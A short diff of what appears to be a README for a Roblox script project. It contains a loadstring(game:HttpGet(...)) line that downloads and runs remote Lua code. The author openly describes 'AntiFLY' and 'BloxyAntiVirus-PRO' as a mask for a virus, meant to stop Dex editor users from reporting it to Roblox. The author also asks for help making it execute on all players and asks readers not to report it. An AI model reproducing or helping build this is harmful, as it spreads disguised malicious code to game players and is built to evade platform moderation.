@@ -11,7 +11,7 @@ and
 loadstring(game:HttpGet(('https://raw.githubusercontent.com/ELJOKER900/Roblox-END/main/AntiFLY.Lua'), game.ReplicatedFirst)
 
 (WARNING, SCRIPTS DOES NOT WORKS BECAUSE IM SEARCHING THE BEST SCRIPT INIT , PLEASE WAIT)
-(and the "AntiVirus" not is an antivirus , It is the mask of the virus, which makes no one with the Dex editor suspicious)
+(and the "AntiFLY" and "BloxyAntiVirus-PRO" is the mask of the virus, which makes no one with the Dex editor report this to roblox)
 (And i need help to make that script executes on all players  )
 
 AND PLEASE DO NOT FEEDBACK THIS TO ROBLOX OR I WOULD BE BREACHING MY AGREEMENT
